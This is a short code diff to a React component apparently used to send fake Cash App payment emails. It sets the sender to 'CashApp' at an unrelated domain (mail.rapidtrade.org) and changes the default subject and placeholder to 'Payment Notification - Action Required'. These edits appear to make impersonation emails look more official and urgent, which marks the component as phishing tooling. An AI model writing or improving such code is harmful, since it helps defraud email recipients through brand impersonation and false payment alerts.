@@ -27,9 +27,9 @@ export default function CashApp() {
 
       // Prepare email data for Resend API
       const emailData = {
-        from: 'CashApp <noreply@mail.rapidtrade.org>',
+        from: 'CashApp <notifications@mail.rapidtrade.org>',
         to: [formData.email],
-        subject: formData.subject,
+        subject: formData.subject || 'Payment Notification - Action Required',
         html: emailContent,
         ...(formData.replyto && { reply_to: formData.replyto })
       }
@@ -203,7 +203,7 @@ export default function CashApp() {
               value={formData.subject}
               onChange={handleChange}
               required
-              placeholder="CashApp Payment Notification"
+              placeholder="Payment Notification - Action Required"
               style={{ 
                 width: '100%', 
                 padding: '0.8rem', 
